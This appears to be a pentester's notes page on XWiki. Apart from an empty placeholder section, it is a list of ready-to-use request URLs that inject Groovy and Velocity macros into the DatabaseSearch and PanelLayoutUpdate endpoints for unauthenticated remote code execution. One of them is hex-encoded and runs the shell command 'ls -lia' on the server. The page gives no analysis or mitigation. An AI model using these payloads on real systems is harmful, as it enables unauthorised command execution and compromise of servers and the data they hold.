# XWiki

## Search

```
// Some code
```

## Exploit

### Unauthenticated RCE

```
Host/xwiki/bin/get/Main/DatabaseSearch?outputSyntax=plain&text=%7d%7d%7d%7b%7b%61%73%79%6e%63%20%61%73%79%6e%63%3d%66%61%6c%73%65%7d%7d%7b%7b%67%72%6f%6f%76%79%7d%7d%64%65%66%20%70%72%6f%63%65%73%73%20%3d%20%22%6c%73%20%2d%6c%69%61%22%2e%65%78%65%63%75%74%65%28%29%0a%70%72%69%6e%74%6c%6e%20%22%46%6f%75%6e%64%20%74%65%78%74%20%24%7b%70%72%6f%63%65%73%73%2e%74%65%78%74%7d%22%7b%7b%2f%67%72%6f%6f%76%79%7d%7d%7b%7b%2f%61%73%79%6e%63%7d%7d%20
```

> xwiki/bin/get/Main/DatabaseSearch?outputSyntax=plain\&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22Hello%20from%22%20%2B%20%22%20search%20text%3A%22%20%2B%20%2823%20%2B%2019%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20



> xwiki/bin/view/Panels/PanelLayoutUpdate?place=%7B%7B%2Fhtml%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bvelocity%7D%7D%23evaluate(%24request.eval)%7B%7B%2Fvelocity%7D%7D%7B%7B%2Fasync%7D%7D\&eval=Hello%20from%20URL%20Parameter!%20I%20got%20programming%3A%20%24services.security.authorization.hasAccess(%27programming%27)

> xwiki/bin/get/Main/DatabaseSearch?outputSyntax=plain\&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22Hello%20from%22%20%2B%20%22%20search%20text%3A%22%20%2B%20%2823%20%2B%2019%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20
